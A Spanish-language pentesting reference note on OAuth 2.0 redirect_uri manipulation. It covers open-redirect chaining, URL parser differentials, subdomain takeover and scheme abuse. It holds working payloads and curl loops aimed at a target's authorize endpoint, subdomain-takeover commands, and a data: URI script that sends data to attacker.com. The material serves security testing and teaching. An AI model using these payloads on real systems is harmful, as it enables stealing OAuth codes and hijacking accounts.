---
aliases:
  - OAuth redirect_uri Bypass
  - OAuth Redirect Manipulation
tags:
  - vuln/oauth
  - technique/redirect-bypass
  - technique/exploitation
primary: "[[OAuth 2.0 Misconfigurations]]"
---

# OAuth 2.0 - redirect_uri Manipulation

`redirect_uri` controla dónde el IdP envía el `code`/`token`. Si atacante controla este destino → roba credentials. Spec exige exact match pre-registered, pero validation laxa es la vuln #1 de OAuth.

## Open Redirect Encadenado

App tiene endpoint open redirect interno **dentro del dominio whitelist**. Atacante encadena: redirect_uri = endpoint open redirect → IdP confía dominio → tras code emitido, open redirect manda code a atacante.

| Patrón vulnerable | Exploit | Resultado |
|-------------------|---------|-----------|
| `https://known.com/redirect?url=X` | `redirect_uri=https://known.com/redirect?url=https://attacker.com` | Code arriba via Referer/redirect chain |
| Login con `next=` param | `redirect_uri=https://known.com/login?next=https://attacker.com` | Post-login redirect leakea code |
| Logout redirect | `redirect_uri=https://known.com/logout?return=https://attacker.com` | Same |
| 404 page con back link | `redirect_uri=https://known.com/404?back=https://attacker.com` | Same |
| OAuth callback re-redirect | App propio que re-redirige post-callback | Code en URL leak via Referer |

```http
# Original whitelist
redirect_uri = https://known.com/cb (registered)

# Atacante envía
GET /oauth/authorize?client_id=APP&response_type=code
   &redirect_uri=https://known.com/redirect?url=https://attacker.com/steal
   &state=...

# IdP valida → known.com matches → emite code
# 302 Location: https://known.com/redirect?url=https://attacker.com/steal&code=XYZ
# known.com redirige → attacker.com recibe code en Referer o param
```

Defensa: pre-registered uri exact match, no internal open redirects.

^oauth-redirect-openredirect

## Path Traversal y Suffix Abuse

Si validation hace prefix/substring match en lugar de exact match, manipular path para escapar al directorio atacante.

| Validación débil | Exploit | Por qué funciona |
|------------------|---------|------------------|
| `startswith("https://known.com/cb")` | `https://known.com/cb/../../atacante` | Path traversal interno (mal) o reach a otra app |
| Domain match sin path | `https://known.com/anything` | Si known.com tiene file upload / open redirect |
| Suffix flexible | `https://known.com.attacker.com/cb` | DNS atacante con prefix `known.com.` |
| Substring | `https://attacker.com/?x=https://known.com/cb` | Server matchea string contenido |
| Trailing slash optional | `https://known.com/cb/` vs `/cb` | Diferente normalize en server |
| Case insensitive | `https://KNOWN.com/cb` | Algunos providers normalizan |
| Unicode similar | `https://kńown.com/cb` (punycode) | IDN homograph |

```bash
# Test suite
for u in \
  "https://known.com/cb" \
  "https://known.com.attacker.com/cb" \
  "https://known-com.attacker.com/cb" \
  "https://attacker.com/?known.com/cb" \
  "https://known.com.attacker.com" \
  "https://known.com@attacker.com/cb" \
  "https://known.com#@attacker.com/cb"; do
  ...
done
```

^oauth-redirect-pathtraversal

## URL Parser Differential

Server valida URL con un parser, browser sigue con otro parser. Atacante explota la diferencia.

| Trick | Server parsea como | Browser sigue como |
|-------|---------------------|---------------------|
| `https://attacker.com#@known.com/` | `host=attacker.com` (mal) o `host=known.com` (bien) según parser | `host=attacker.com` |
| `https://known.com@attacker.com/cb` | userinfo=known.com, host=attacker.com | Idem |
| `https://known.com\.attacker.com/cb` | Backslash → diferentes parsers ven `known.com` o `attacker.com` | Browser: `known.com\.attacker.com` host |
| `https://attacker.com\@known.com/cb` | Tab/control char break | Inconsistente |
| `https://known.com:80@attacker.com/cb` | Port en userinfo | Same as `@` trick |
| `https://known.com?x=@attacker.com/cb` | Query char dispute | Server vs browser difer |
| `https://[::known.com]/cb` | IPv6 brackets | Some parsers fail |
| `https:///known.com/cb` | Triple slash | Some parsers `host=""` |

Ver paper Orange Tsai 2017 "A New Era of SSRF" — 30+ parser inconsistencies catalogadas.

```bash
# Probar todos los tricks de parser confusion
for trick in \
  'https://attacker.com#@known.com/cb' \
  'https://known.com@attacker.com/cb' \
  'https://known.com\.attacker.com/cb' \
  'https://known.com:443@attacker.com/cb' \
  'https://known.com?@attacker.com/cb' \
  'https:///attacker.com/cb' \
  'https:/\/attacker.com/cb'; do
  ENC=$(printf '%s' "$trick" | jq -sRr @uri)
  curl -sI "https://target/oauth/authorize?...&redirect_uri=$ENC" | grep -i location
done
```

^oauth-redirect-parser

## Subdomain Confusion / Takeover

Whitelist `*.known.com` o `https://anything.known.com/cb`. Atacante busca subdomain takeable o registra subdomain self-service.

| Vector | Cómo | Resultado |
|--------|------|-----------|
| **Subdomain takeover (CNAME dangling)** | Buscar `*.known.com` apuntando a Heroku/S3/GitHub Pages no claimed | Atacante reclama, sirve código atacante |
| **Self-service subdomain** | Apps tipo Squarespace, Tumblr permiten `username.platform.com` | Si platform es target, registrar subdomain |
| **Dev/staging open** | `dev.known.com` con auth débil o bypass | Inyectar código en dev |
| **Customer subdomain** | `customer1.known.com` en SaaS multitenancy | Si atacante es customer, sirve PoC desde su tenant |
| **Wildcard cert leak** | Cert expuesto `*.known.com` private key | MITM cualquier subdomain |
| **DNS rebinding** | DNS responde primero known IP luego attacker IP | TOCTOU bypass |

```bash
# Recon subdomains takeover
subfinder -d known.com | httpx -title -web-server | grep -iE '(domain not configured|no such app|nosuchbucket|github\.io)'

# Verify takeover
nuclei -l subdomains.txt -t http/takeovers/

# Trial reclaim del más probable
# Heroku: heroku apps:create attacker-victim
# GitHub Pages: crear repo + CNAME
# AWS S3: aws s3 mb s3://victim-bucket
```

^oauth-redirect-subdomain

## Scheme Abuse y Native App Hijack

Aplicaciones mobile/desktop registran custom URL schemes (`com.app://callback`) o loopback. Validation pobre permite scheme switching.

| Scheme abuse | Exploit | Plataforma |
|--------------|---------|------------|
| `javascript:` | `redirect_uri=javascript:alert(document.cookie)` | XSS si server reflecta |
| `data:` | `redirect_uri=data:text/html,<script>...</script>` | Idem |
| Custom scheme hijack (Android) | App atacante registra mismo `intent-filter` que app legit | Android intent picker → user puede seleccionar atacante |
| iOS Universal Links bypass | Browser maneja URL antes de redirect a app | Code en browser, app atacante captura |
| Loopback redirect_uri | `http://127.0.0.1:PORT/cb` | Atacante local-only — pero confused deputy |
| `file://` | `redirect_uri=file:///etc/passwd` | Algunos parsers lo aceptan |
| FTP/Gopher schemes | Legacy parsers | SSRF combo |
| Cross-app intent (Android) | `intent://...#Intent;...` | Bypass intent-filter |

```bash
# JS scheme test
curl -sI "https://target/oauth/authorize?...&redirect_uri=javascript:alert(1)"

# Data scheme
RU=$(printf 'data:text/html,<script>fetch(location.search).then(r=>fetch("https://attacker.com?"+r))</script>' | jq -sRr @uri)
curl -sI "https://target/oauth/authorize?...&redirect_uri=$RU"
```

Android: si app legit declara `<intent-filter android:scheme="myapp">`, atacante puede declarar mismo intent-filter en su app malware. User instala atacante's app → al recibir callback, sistema muestra picker → puede elegir mal.

^oauth-redirect-scheme
